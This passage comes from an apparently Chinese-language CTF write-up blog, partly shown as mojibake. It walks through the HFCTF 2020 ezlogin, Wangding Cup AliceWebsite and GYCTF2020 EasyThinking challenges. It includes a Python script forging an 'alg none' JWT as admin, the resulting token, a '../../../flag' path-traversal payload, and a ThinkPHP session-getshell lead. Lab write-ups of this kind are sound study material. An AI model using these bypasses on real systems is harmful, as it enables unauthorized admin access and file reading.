id&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†å…ˆå»å¯»æ‰¾<code>token</code>æ‰€åœ¨çš„ä½ç½®ï¼Œç„¶åä»<code>token</code>ä¸­è§£æå‡º<code>sid</code>å¹¶æ‰“å°å‡ºæ¥ã€‚æ³¨æ„æœ€åçš„<code>if</code>åˆ¤æ–­è¯­å¥ï¼šå¦‚æœ<code>sid</code>æœªå®šä¹‰&#x2F;ä¸ºç©º&#x2F;(<code>0&lt;=sid&lt;=global.secrets.length</code>ä¸ºå‡)é‚£ä¹ˆå°±ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">        <span class="hljs-keyword">const</span> status = username === user.<span class="hljs-property">username</span> &amp;&amp; password === user.<span class="hljs-property">password</span>;<br><br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        &#125;<br><br><br><span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            flag<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br></code></pre></td></tr></table></figure><p>ä¼šè¯å¯¹è±¡ä¸­<code>username</code>éœ€è¦æ˜¯<code>admin</code>ï¼Œå‰é¢åšäº†<code>JWT</code>æ‰€ä»¥çŒœæµ‹è¦ä¿®æ”¹<code>JWT</code>çš„å¯¹åº”å­—æ®µè¾¾åˆ°ç›®çš„ï¼Œæœ€ç»ˆè¯»å–<code>FLAG</code></p><p>æœ‰å…³<code>JWT</code>çš„å†…å®¹å¯ä»¥å‚è€ƒè¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼š<code>[JSON Web Tokenï¼ˆJWTï¼‰åŸç†åŠç”¨æ³• | ä¿¡å®‰å°èš‚èš (gitee.io)](https://mayi077.gitee.io/2020/05/19/JSON-Web-Tokenï¼ˆJWTï¼‰åŸç†åŠç”¨æ³•/)</code></p><p>ç°åœ¨è§£é¢˜æ€è·¯å°±æ¸…æ™°äº†ï¼šæ³¨å†Œ â€“&gt; ä¿®æ”¹<code>JWT</code>ä½¿å…¶éªŒè¯çš„<code>username</code>ä¸º<code>admin</code> â€“&gt; ç™»å½•</p><p>å…ˆæ³¨å†Œä¸€ä¸ª<code>test</code>ç”¨æˆ·çœ‹çœ‹è¿™ä¸ª<code>JWT</code>ï¼š</p><p><img src="/img/hfctf2020ezlogin4.png" alt="hfctf2020ezlogin4"></p><p>æ”¾è¿™ä¸ªç½‘ç«™è§£å¯†ï¼š<code>[JSON Web Tokens - jwt.io](https://jwt.io/)</code></p><p><img src="/img/hfctf2020ezlogin5.png" alt="hfctf2020ezlogin5"></p><p>é¦–å…ˆæˆ‘ä»¬è¦ä¿®æ”¹<code>username</code>å­—æ®µä¸º<code>admin</code>ã€‚ç„¶åæ³¨æ„ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> secret = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>[sid];<br><br><span class="hljs-keyword">const</span> user = jwt.<span class="hljs-title function_">verify</span>(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br></code></pre></td></tr></table></figure><p>ä» <code>global.secrets</code> æ•°ç»„ä¸­è·å–æŒ‡å®šç´¢å¼• <code>sid</code> å¤„çš„å…ƒç´ ï¼Œç„¶åå°†å…¶èµ‹å€¼ç»™ <code>secret</code> å˜é‡ã€‚<code>jwt.verify()</code> æ–¹æ³•æ¥å—ä¸‰ä¸ªå‚æ•°ï¼šè¦éªŒè¯çš„ <code>token</code>ã€å¯†é’¥ <code>secret</code> å’Œä¸€ä¸ªåŒ…å«é€‰é¡¹çš„å¯¹è±¡ã€‚åœ¨è¿™é‡Œï¼Œé€‰æ‹©äº† <code>algorithm: &#39;HS256&#39;</code>ï¼Œè¡¨ç¤ºä½¿ç”¨<code> HMAC-SHA256</code> ç®—æ³•è¿›è¡ŒéªŒè¯ã€‚</p><p>æ‰€ä»¥ä¸èƒ½åªè€ƒè™‘æ›´æ¢<code>username</code>å­—æ®µå€¼ï¼Œå°±ç®—æ”¹äº†ç­¾åé‚£é‡Œè¿‡ä¸äº†éªŒè¯ä¹Ÿæ˜¯ç™½æ­ã€‚</p><p>é¦–å…ˆæ˜¯å¯¹äºåŠ å¯†æ–¹å¼çš„åˆ©ç”¨ï¼š</p><p><img src="/img/hfctf2020ezlogin6.png" alt="hfctf2020ezlogin6"></p><p>ä½†åªæ”¹æˆ<code>none</code>æ²¡å•¥ç”¨(éªŒè¯æ—¶è¿˜æ˜¯æŒ‡å®šäº†ç®—æ³•ä¸º<code>HS256</code>)</p><blockquote><p>ç”¨çš„æ˜¯ HS256åŠ å¯†ï¼Œä½†ç»è¿‡æµ‹è¯•å‘ç°ï¼Œå½“åŠ å¯†æ—¶ä½¿ç”¨çš„æ˜¯ none æ–¹æ³•ï¼ŒéªŒè¯æ—¶åªè¦å¯†é’¥å¤„ä¸º undefined æˆ–è€…ç©ºä¹‹ç±»çš„ï¼Œå³ä¾¿åé¢çš„ç®—æ³•æŒ‡åä¸º HS256ï¼ŒéªŒè¯ä¹Ÿè¿˜æ˜¯æŒ‰ç…§ none æ¥éªŒè¯é€šè¿‡ï¼Œè¿™æ ·å¾ˆè½»æ¾åœ°å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª username ä¸º admin çš„ jwttoken äº†ã€‚</p></blockquote><p>å…·ä½“åŸç†å¯ä»¥å‚è€ƒèµµå¸ˆå‚…çš„åšå®¢ï¼š<code>[è™ç¬¦ CTF Web éƒ¨åˆ† Writeup â€“ glzjin (zhaoj.in)](https://www.zhaoj.in/read-6512.html)</code>ï¼Œå¸ˆå‚…è®²çš„éå¸¸è¯¦ç»†æˆ‘å°±ä¸å†™äº†ï¼Œè´´å¼ æ¯”è¾ƒé‡è¦çš„å›¾ï¼š</p><p><img src="/img/hfctf2020ezlogin7.png" alt="hfctf2020ezlogin7"></p><p>ç°åœ¨æˆ‘ä»¬éœ€è¦æŠŠ<code>secret</code>å¯†é’¥ç½®ç©ºï¼Œçœ‹ä¸‹è¿™ä¸œè¥¿æ€ä¹ˆæ¥çš„ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> secret = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>[sid];<br></code></pre></td></tr></table></figure><p>ä» <code>global.secrets</code> æ•°ç»„ä¸­è·å–ç´¢å¼•ä¸º <code>sid</code> çš„å…ƒç´ </p><p><code>sid</code>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sid = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(token.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>()).<span class="hljs-property">secretid</span>;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> secretid = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span>;<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-title function_">push</span>(secret)<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¿®æ”¹ secretidï¼Œä½¿å…¶æ— æ³•ä½œä¸ºå…¨å±€å˜é‡ secrets æ•°ç»„çš„ç´¢å¼•ï¼Œé‚£ä¹ˆ secret å°±ä¼šä¸ºç©ºäº†ã€‚å½“ç„¶è¿™ä¸œè¥¿ä¹Ÿä¸èƒ½ä¹±æ”¹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/hfctf2020ezlogin8.png" alt="hfctf2020ezlogin8"></p><p>åŒæ ·å‚è€ƒäº†èµµå¸ˆå‚…çš„åšå®¢ï¼Œå¯ä»¥çœ‹åˆ°ä»¤<code>sid</code>ä¸ºä¸€ä¸ªç©ºæ•°ç»„æ—¶ï¼Œ<code>a[sid]</code>ä¸º<code>undefined</code>ã€‚</p><blockquote><p>JavaScript æ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€ï¼Œç©ºæ•°ç»„ä¸æ•°å­—æ¯”è¾ƒæ°¸è¿œä¸ºçœŸ</p></blockquote><p>å½“ç„¶è¿™é‡Œç”¨<code>&quot;0eå•¥çš„&quot;</code>ç»•è¿‡ä¹Ÿå¯ä»¥(ä¸åŒç±»å‹è¿›è¡Œæ¯”è¾ƒæ—¶ä¹Ÿä¼šæœ‰ç±»å‹è½¬æ¢)</p><p>ç”Ÿæˆ<code>token</code>(å½“ç„¶è¿™é‡Œä¹Ÿèƒ½è‡ªå·±æ‰‹åŠ¨æ”¹):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> jwt<br><br>info = &#123;<span class="hljs-string">&#x27;iat&#x27;</span>: <span class="hljs-built_in">int</span>(time.time()),<br>    <span class="hljs-string">&quot;secretid&quot;</span>: <span class="hljs-string">&quot;0e123&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;<br><br>token = jwt.encode(info,key=<span class="hljs-string">&quot;&quot;</span>,algorithm=<span class="hljs-string">&quot;none&quot;</span>)<br><br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure><p><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpYXQiOjE3MDI4MDE4NTgsInNlY3JldGlkIjoiMGUxMjMiLCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9.</code></p><p><img src="/img/hfctf2020ezlogin9.png" alt="hfctf2020ezlogin9"></p><p>ç™»å½•<code>GetFlag</code></p><p><img src="/img/hfctf2020ezlogin10.png" alt="hfctf2020ezlogin10"></p><h2 id="ç½‘é¼æ¯-2020-åŠå†³èµ›-AliceWebsite"><a href="#ç½‘é¼æ¯-2020-åŠå†³èµ›-AliceWebsite" class="headerlink" title="[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite"></a>[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite</h2><p><img src="/img/AliceWebsite1.png" alt="AliceWebsite1"></p><p>æ³¨æ„<code>URL</code>:<code>/index.php?action=home.php</code></p><p>ç»™äº†ä¸ªå‹ç¼©åŒ…ï¼š</p><p><img src="/img/AliceWebsite2.png" alt="AliceWebsite2"></p><p><code>DSSTORE</code>æ–‡ä»¶é‡Œæ²¡å•¥ä¸œè¥¿:</p><p><img src="/img/AliceWebsite3.png" alt="AliceWebsite3"></p><p><code>index.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$action</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] : <span class="hljs-string">&#x27;home.php&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$action</span>)) &#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$action</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„ä»»æ„æ–‡ä»¶åŒ…å«ï¼Œæ³¨æ„è¿™é‡Œä¼šå…ˆè¿›è¡Œ<code>file_exists</code>ï¼Œæ‰€ä»¥ä¼ªåè®®ä¸è¦æƒ³äº†ã€‚</p><p><code>etc/passwd</code>èƒ½è¯»ï¼š</p><p><img src="/img/AliceWebsite5.png" alt="AliceWebsite5"></p><p>ç›®å½•ç©¿è¶Šè¯»flag:<code>/index.php?action=../../../flag</code></p><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p><code>www.zip</code>:é‡Œé¢æœ‰ä¸ª<code>README.md</code></p><p><img src="/img/gyctf2020EasyThinking1.png" alt="gyctf2020EasyThinking1"></p><p>æœäº†ä¸‹<code>thinkphp6</code>æœ‰ä»€ä¹ˆæ´ï¼š</p><p><code>[Thinkphp &lt; 6.0.2 session idæœªä½œè¿‡æ»¤å¯¼è‡´getshell - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](https://xz.aliyun.com/t/7109)</code></p><p>ä¸»è¦å°±æ˜¯ç”±äºç¨‹åºæœªå¯¹session idè¿›è¡Œå±é™©å­—ç¬¦åˆ¤æ–­ï¼Œåªè¦å°†session idå†™ä¸ºç±»ä¼¼äº<code>xxxx.php</code>çš„æ ¼å¼ï¼Œå³å¯å¯¼è‡´sessionä¿å­˜æˆ<code>.php</code>æ–‡ä»¶ï¼Œä»è€Œgetshellã€‚</p><p><code>app/home/controler</code>ä¸‹å­˜åœ¨<code>member.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">home</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">exception</span>\<span class="hljs-title">ValidateException</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Db</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">View</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">common</span>\<span class="hljs-title">model</span>\<span class="hljs-title">User</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">common</span>\<span class="hljs-title">controller</span>\<span class="hljs-title">Auth</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Member</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;?UID&quot;</span>)) <span class="hljs-comment">//</span><br>        &#123;<br>            <span class="hljs-variable">$data</span> = [<span class="hljs-string">&quot;uid&quot;</span> =&gt; <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>)];<br>            <span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);<br>            <span class="hljs-variable">$recordArr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$record</span>);<br>            <span class="hljs-variable">$username</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&quot;user&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-variable">$data</span>)-&gt;<span class="hljs-title function_ invoke__">value</span>(<span class="hljs-string">&quot;username&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;member/index&#x27;</span>,[<span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-variable">$username</span>,<span class="hljs-string">&quot;record_list&quot;</span> =&gt; <span class="hljs-variable">$recordArr</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;member/index&#x27;</span>,[<span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-string">&quot;Are you Login?&quot;</span>,<span class="hljs-string">&quot;record_list&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;username&quot;</span>);<br>            <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;password&quot;</span>));<br>            <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;username&quot;</span>] = <span class="hljs-variable">$username</span>;<br>            <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;password&quot;</span>] = <span class="hljs-variable">$password</span>;<br>            <span class="hljs-variable">$userId</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&quot;user&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-variable">$data</span>)-&gt;<span class="hljs-title function_ invoke__">value</span>(<span class="hljs-string">&quot;uid&quot;</span>);<br>            <span class="hljs-variable">$userStatus</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&quot;user&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-variable">$data</span>)-&gt;<span class="hljs-title function_ invoke__">value</span>(<span class="hljs-string">&quot;status&quot;</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$userStatus</span> == <span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;è¯¥ç”¨æˆ·å·²è¢«ç¦ç”¨ï¼Œæ— æ³•ç™»é™†\&quot;);history.go(-1)&lt;/script&gt;&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$userId</span>)&#123;<br>                <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>,<span class="hljs-variable">$userId</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&quot;/home/member/index&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯\&quot;);history.go(-1)&lt;/script&gt;&quot;</span>;<br><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Auth</span>)-&gt;<span class="hljs-title function_ invoke__">validRegister</span>(<span class="hljs-variable">$data</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;å½“å‰ç”¨æˆ·åå·²æ³¨å†Œ\&quot;);history.go(-1)&lt;/script&gt;&quot;</span>;<br>            &#125;<br>            <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;password&quot;</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br>            <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;status&quot;</span>] = <span class="hljs-number">0</span>;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-variable">$data</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/home/member/login&#x27;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;æ³¨å†Œå¤±è´¥\&quot;);history.go(-1)&lt;/script&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">View</span>(<span class="hljs-string">&quot;register&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>,<span class="hljs-literal">NULL</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;location.href=&#x27;/home/member/login&#x27;&lt;/script&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateUser</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br>        <span class="hljs-variable">$update</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&quot;user&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&quot;uid&quot;</span>,<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>))-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$update</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&quot;code&quot;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;ä¿®æ”¹æˆåŠŸ&quot;</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&quot;code&quot;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;ä¿®æ”¹å¤±è´¥&quot;</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rePassword</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$oldPassword</span> = <span class="hljs-title function_ invoke__">input</span>(<span 